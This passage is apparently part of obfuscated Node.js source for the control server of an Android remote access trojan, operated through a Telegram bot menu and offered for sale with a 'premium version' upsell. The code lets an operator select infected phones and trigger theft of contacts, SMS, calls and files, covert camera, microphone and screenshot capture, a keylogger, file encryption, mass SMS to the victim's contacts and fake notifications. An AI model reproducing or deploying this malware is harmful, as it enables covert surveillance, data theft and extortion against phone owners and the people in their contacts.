                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝚂𝚎𝚗𝚍 𝚂𝙼𝚂</b> 👁️‍🗨️") {
                                appData.set("currentAction", "smsNumber");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂</b>\n\n", {
                                  'parse_mode': 'HTML',
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝚅𝚒𝚋𝚛𝚊𝚝𝚎</b> 👁️‍🗨️") {
                                appData.set("currentAction", "vibrateDuration");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b> 👁️‍🗨️") {
                                appData.set("currentAction", "textToAllContacts");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚝𝚊𝚛𝚐𝚎𝚝 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b> 👁️‍🗨️") {
                                appData.set("currentAction", "notificationText");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙾𝚙𝚎𝚗 𝚄𝚁𝙻</b> 👁️‍🗨️") {
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy <b>Romeo Uchiha</b></b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐</b> 👁️‍🗨️") {
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy <b>Romeo Uchiha</b></b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘</b> 👁️‍🗨️") {
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy <b>Romeo Uchiha</b></b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                            } else {
                              io.sockets.sockets.forEach((_0x22a16b, _0x30e015, _0x5acd93) => {
                                if (_0xdbde0c.text === _0x22a16b.model) {
                                  appData.set("currentTarget", _0x30e015);
                                  bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + _0x22a16b.model + "</b>\n\n", {
                                    'parse_mode': "HTML",
                                    'reply_markup': {
                                      'keyboard': [["👁️‍🗨️ <b>𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝙼𝚂</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙲𝚊𝚕𝚕𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚙𝚙𝚜</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚃𝚘𝚊𝚜𝚝</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝚂𝚎𝚗𝚍 𝚂𝙼𝚂</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚅𝚒𝚋𝚛𝚊𝚝𝚎</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙶𝚊𝚕𝚕𝚎𝚛𝚢</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙴𝚗𝚌𝚛𝚢𝚙𝚝</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙳𝚎𝚌𝚛𝚢𝚙𝚝</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙾𝚙𝚎𝚗 𝚄𝚁𝙻</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b> 👁️‍🗨️"]],
                                      'resize_keyboard': true,
                                      'one_time_keyboard': true
                                    }
                                  });
                                }
                              });
                              if (_0xdbde0c.text == "👁️‍🗨️ <b>𝙰𝚕𝚕</b> 👁️‍🗨️") {
                                appData.set("currentTarget", "all");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝙼𝚂</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙲𝚊𝚕𝚕𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚙𝚙𝚜</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚃𝚘𝚊𝚜𝚝</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝚂𝚎𝚗𝚍 𝚂𝙼𝚂</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚅𝚒𝚋𝚛𝚊𝚝𝚎</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙶𝚊𝚕𝚕𝚎𝚛𝚢</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙴𝚗𝚌𝚛𝚢𝚙𝚝</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙳𝚎𝚌𝚛𝚢𝚙𝚝</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙾𝚙𝚎𝚗 𝚄𝚁𝙻</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
});
setInterval(() => {
  io.sockets.sockets.forEach((_0x107f46, _0x316932, _0x1f46f7) => {
    io.to(_0x316932).emit("ping", {});
  });
}, 0x1388);
setInterval(() => {
  https.get(data.host, _0x9df260 => {}).on("error", _0x26bc04 => {});
}, 0x75300);
server.listen(process.env.PORT || 0xbb8, () => {
  console.log("listening on port 3000 - <b>Romeo Uchiha</b>");
});
